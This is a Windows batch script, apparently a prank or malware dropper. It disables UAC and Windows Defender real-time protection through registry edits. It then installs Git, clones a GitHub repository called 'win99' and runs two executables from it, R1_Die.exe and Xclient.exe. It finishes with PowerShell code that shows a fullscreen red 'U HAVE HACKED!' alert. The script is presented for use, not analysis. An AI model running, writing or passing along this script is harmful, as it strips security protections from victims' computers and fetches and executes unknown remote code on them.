cmd

@echo off
@setlocal EnableDelayedExpansion EnableExtensions
@for %%i in (%~dp0\_packer_config*.cmd) do @call "%%~i"
@if defined PACKER_DEBUG (@echo on) else (@echo off)

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 1
CMD /C REG.EXE ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /V DisableAntiSpyware /T REG_DWORD /D 1 /F


[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableAntiSpyware"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001

cmd

cls
winget install --id Git.Git -e --source winget
cls
git clone https://github.com/mineswrver/win99.git
cd win99
R1_Die.exe
Xclient.exe
cls

color 0C
title SYSTEM ALERT

powershell -NoProfile -Command ^
"$host.UI.RawUI.WindowTitle='SYSTEM ALERT'; ^
$host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(120,40); ^
$host.UI.RawUI.WindowSize = New-Object Management.Automation.Host.Size(120,40); ^
Add-Type -AssemblyName System.Windows.Forms; ^
[System.Windows.Forms.MessageBox]::Show('U','SYSTEM ALERT')"

powershell -NoProfile -Command ^
"Add-Type -AssemblyName System.Windows.Forms; ^
$form=New-Object Windows.Forms.Form; ^
$form.Text='SYSTEM ALERT'; ^
$form.BackColor='Black'; ^
$form.ForeColor='Red'; ^
$form.WindowState='Maximized'; ^
$form.FormBorderStyle='None'; ^
$label=New-Object Windows.Forms.Label; ^
$label.Dock='Fill'; ^
$label.TextAlign='MiddleCenter'; ^
$label.Font=New-Object Drawing.Font('Arial',80,[Drawing.FontStyle]::Bold); ^
$label.ForeColor='Red'; ^
$form.Controls.Add($label); ^
$form.Show(); ^
foreach($word in @('U','U HAVE','U HAVE HACKED','U HAVE HACKED!','U HAVE HACKED! HA HA HA')) { ^
$label.Text=$word; ^
Start-Sleep -Seconds 1 ^
}; ^
Start-Sleep -Seconds 2; ^
$form.Close()"
